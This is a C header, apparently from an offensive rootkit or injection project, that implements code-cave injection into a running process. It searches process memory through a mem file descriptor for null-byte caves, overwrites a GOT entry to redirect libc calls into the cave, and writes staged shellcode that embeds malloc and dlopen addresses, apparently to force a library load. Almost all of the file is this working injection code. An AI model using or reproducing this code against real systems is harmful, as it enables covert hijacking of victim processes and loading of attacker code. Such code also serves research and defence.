#ifndef __MEM_CODE_CAVER_H
#define __MEM_CODE_CAVER_H

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/stat.h>

#include "../common/constants.h"

#define CODE_CAVE_LENGTH_BYTES 0x40
#define NULL_BYTE 0x00

__u64 cave_find(int mem_fd, int cave_length, __u64 from, __u64 to){
    int null_counter = 0;
    lseek(mem_fd, from, SEEK_SET);
    for(__u64 ii = from; ii<to; ii++){
        char c;
        read(mem_fd, &c, 1);
        if(c == NULL_BYTE){
            null_counter++;
        }else{
            null_counter = 0;
        }
        if(null_counter >= CODE_CAVE_LENGTH_BYTES){
            printf("Found code cave at %llx\n", ii);
            return ii;
        }
    }
    printf("Cave not found between %llx and %llx\n", from, to);
    return 0;
}

__u64 code_cave_find_address(int mem_fd, __u64 from, __u64 to, char flags[], __u32 pgoff, __u32 major, __u32 minor, __u64 ino){
    __u64 cave_addr;
    cave_addr = cave_find(mem_fd, CODE_CAVE_LENGTH_BYTES, from, to);

    return cave_addr;
}


int code_cave_write_shellcode(int mem_fd, __u64 cave_addr, __u64 got_addr, __u64 malloc_addr, __u64 dlopen_addr){
    //Writing the code cave address in the GOT section, future calls to libc will be redirected
    size_t len = sizeof(__u64);
    __u64 buf_n = (__u64)cave_addr;
    lseek(mem_fd, got_addr, SEEK_SET);
    for(size_t ii=0; ii<len; ii++){
        if(write(mem_fd, (void*)&buf_n+ii, 1) < 0 ){
            perror("Error while writing at GOT");
            return -1;
        }
    }

    //First part of shellcode
    len = CODE_CAVE_SHELLCODE_ASSEMBLE_1_LEN; 
    char* buf_c = CODE_CAVE_SHELLCODE_ASSEMBLE_1;
    lseek(mem_fd, cave_addr, SEEK_SET);
    for(size_t ii=0; ii<len; ii++){
        if(write(mem_fd, (void*)buf_c+ii, 1) < 0 ){
            perror("Error while writing shellcode 1");
            return -1;
        }
    }
    
    //Writing malloc address
    len = sizeof(__u64);
    buf_n = (__u64)malloc_addr;
    for(size_t ii=0; ii<len; ii++){
        if(write(mem_fd, (void*)&buf_n+ii, 1) < 0 ){
            perror("Error while writing malloc address");
            return -1;
        }
    }

    //Second part of shellcode
    len = CODE_CAVE_SHELLCODE_ASSEMBLE_2_LEN;
    buf_c = CODE_CAVE_SHELLCODE_ASSEMBLE_2;
    for(size_t ii=0; ii<len; ii++){
        if(write(mem_fd, (void*)buf_c+ii, 1) < 0 ){
            perror("Error while writing shellcode 2");
            return -1;
        }
    }

    //Writing dlopen address
    len = sizeof(__u64);
    buf_n = (__u64)dlopen_addr;
    for(size_t ii=0; ii<len; ii++){
        if(write(mem_fd, (void*)&buf_n+ii, 1) < 0 ){
            perror("Error while writing dlopen address");
            return -1;
        }
    }

    //Third part of shellcode
    len = CODE_CAVE_SHELLCODE_ASSEMBLE_3_LEN;
    buf_c = CODE_CAVE_SHELLCODE_ASSEMBLE_3;
    for(size_t ii=0; ii<len; ii++){
        if(write(mem_fd, (void*)buf_c+ii, 1) < 0 ){
            perror("Error while writing shellcode 3");
            return -1;
        }
    }
    
    printf("Finished writing shellcode at %llx\n", cave_addr);
    
    return 0;
}


#endif